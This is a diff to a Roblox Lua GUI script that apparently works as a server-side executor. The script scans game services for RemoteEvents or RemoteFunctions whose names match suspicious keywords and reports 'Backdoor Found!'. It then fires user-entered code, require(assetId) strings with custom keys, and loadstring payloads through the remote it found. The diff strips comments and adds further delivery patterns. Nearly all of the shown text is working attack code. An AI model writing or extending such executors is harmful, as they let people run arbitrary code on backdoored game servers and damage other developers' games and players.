@@ -872,7 +872,6 @@ local script = G2L["3"];
 			workspace
 		}
 	
-		-- Scan loop traversing across boundary channels and workspace models
 		for _, service in ipairs(targetServices) do
 			for _, object in ipairs(service:GetDescendants()) do
 				-- Vector A: Remote Channel Identification
@@ -891,7 +890,6 @@ local script = G2L["3"];
 					local standardizedName = string.lower(object.Name)
 					for _, word in ipairs(signatureKeywords) do
 						if string.find(standardizedName, word, 1, true) then
-							-- Check if model houses hidden execution scripts or remote links
 							local fallbackRemote = object:FindFirstChildOfClass("RemoteEvent") or object:FindFirstChildOfClass("RemoteFunction")
 							if fallbackRemote then
 								verifiedServerRemote = fallbackRemote
@@ -906,17 +904,17 @@ local script = G2L["3"];
 			if verifiedServerRemote then break end
 		end
 	
-		-- Evaluate findings to dispatch correct system warnings matching specifications
+		-- Evaluate findings
 		if verifiedServerRemote then
 			firewallAccessGranted = true
 			codeTextBox.TextEditable = true
-			codeTextBox.Text = "" -- Wipes prompt to accept direct script injection
+			codeTextBox.Text = "" 
 			scanButton.Text = "UNLOCKED"
 	
 			StarterGui:SetCore("SendNotification", {
 				Title = "Scan Status",
 				Text = "Backdoor Found!",
-				Icon = "rbxassetid://10611414436", -- Alert graphic asset
+				Icon = "rbxassetid://10611414436", 
 				Duration = 4
 			})
 		else
@@ -927,14 +925,14 @@ local script = G2L["3"];
 	
 			StarterGui:SetCore("SendNotification", {
 				Title = "Scan Status",
-				Text = "Backdoor Not failed!", -- Requested status confirmation phrasing
-				Icon = "rbxassetid://10611412030", -- Generic status asset
+				Text = "Backdoor Not failed!", 
+				Icon = "rbxassetid://10611412030", 
 				Duration = 4
 			})
 		end
 	end
 	
-	-- Starlight Payload Parsing Engine
+	-- Advanced Payload Parsing Engine (Supports require strings and keys)
 	local function fireServerSidePayload()
 		if not firewallAccessGranted or not verifiedServerRemote then
 			StarterGui:SetCore("SendNotification", {
@@ -948,52 +946,64 @@ local script = G2L["3"];
 		local textBuffer = codeTextBox.Text
 		if textBuffer == "" or textBuffer == "[Locked: Click Scan Button To Unlock]" then return end
 	
-		-- Cleanse input whitespace to process execution types matching Starlight spec
+		-- Cleanse input whitespace
 		local cleanInput = string.match(textBuffer, "^%s*(.-)%s*$")
 	
-		-- Check if the text matches a pure asset require format: require(123456) or just a raw ID string
-		local numericId = string.match(cleanInput, "^require%(%s*(%d+)%s*%)") or string.match(cleanInput, "^(%d+)$")
+		-- Match format: require(17182254638)("c0olerishere")
+		local numericId, customKey = string.match(cleanInput, "^require%(%s*(%d+)%s*%)%(%s*["'](.-)["']%s*%)")
 	
-		if numericId then
-			-- Target requires formatted identically to the classic SS runtime payload distribution structures
-			pcall(function()
-				if verifiedServerRemote:IsA("RemoteEvent") then
-					verifiedServerRemote:FireServer("require", tonumber(numericId))
+	-- Fallback match for just require(1234) or 1234
+	if not numericId then
+		numericId = string.match(cleanInput, "^require%(%s*(%d+)%s*%)") or string.match(cleanInput, "^(%d+)$")
+	end
+	
+	if numericId then
+		local targetId = tonumber(numericId)
+	
+		-- Multi-args delivery pattern for custom-keyed modules
+		pcall(function()
+			if verifiedServerRemote:IsA("RemoteEvent") then
+				if customKey then
+					verifiedServerRemote:FireServer("require", targetId, customKey)
+					verifiedServerRemote:FireServer(targetId, customKey)
 				else
-					verifiedServerRemote:InvokeServer("require", tonumber(numericId))
+					verifiedServerRemote:FireServer("require", targetId)
+					verifiedServerRemote:FireServer(targetId)
 				end
-			end)
-			pcall(function()
-				if verifiedServerRemote:IsA("RemoteEvent") then
-					verifiedServerRemote:FireServer(tonumber(numericId))
+			else
+				if customKey then
+					verifiedServerRemote:InvokeServer("require", targetId, customKey)
+					verifiedServerRemote:InvokeServer(targetId, customKey)
 				else
-					verifiedServerRemote:InvokeServer(tonumber(numericId))
+					verifiedServerRemote:InvokeServer("require", targetId)
+					verifiedServerRemote:InvokeServer(targetId)
 				end
-			end)
-			pcall(function()
-				if verifiedServerRemote:IsA("RemoteEvent") then
-					verifiedServerRemote:FireServer("require(" .. numericId .. ")")
-				else
-					verifiedServerRemote:InvokeServer("require(" .. numericId .. ")")
-				end
-			end)
-		else
-			-- Treat input text string as compilation code blocks (loadstring/run mode)
-			pcall(function()
-				if verifiedServerRemote:IsA("RemoteEvent") then
-					verifiedServerRemote:FireServer(textBuffer)
-				else
-					verifiedServerRemote:InvokeServer(textBuffer)
-				end
-			end)
-			pcall(function()
-				if verifiedServerRemote:IsA("RemoteEvent") then
-					verifiedServerRemote:FireServer("loadstring", textBuffer)
-				else
-					verifiedServerRemote:InvokeServer("loadstring", textBuffer)
-				end
-			end)
-		end
+			end
+		end)
+	
+		-- String-wrapped delivery pattern fallback
+		pcall(function()
+			local rawExecutionString = customKey and string.format([[require(%d)("%s")]], targetId, customKey) or string.format([[require(%d)]], targetId)
+			if verifiedServerRemote:IsA("RemoteEvent") then
+				verifiedServerRemote:FireServer(rawExecutionString)
+				verifiedServerRemote:FireServer("loadstring", rawExecutionString)
+			else
+				verifiedServerRemote:InvokeServer(rawExecutionString)
+				verifiedServerRemote:InvokeServer("loadstring", rawExecutionString)
+			end
+		end)
+	else
+		-- Direct execution fallback for raw script scripts
+		pcall(function()
+			if verifiedServerRemote:IsA("RemoteEvent") then
+				verifiedServerRemote:FireServer(textBuffer)
+				verifiedServerRemote:FireServer("loadstring", textBuffer)
+			else
+				verifiedServerRemote:InvokeServer(textBuffer)
+				verifiedServerRemote:InvokeServer("loadstring", textBuffer)
+			end
+		end)
+	end
 	end
 	
 	-- Connect backdoor engine hooks into visual element listeners
@@ -1130,6 +1140,7 @@ local script = G2L["3"];
 	end
 	
 	InitializeDragSystem()
+	
 end;
 task.spawn(C_3);
 -- StarterGui.BlairGui.
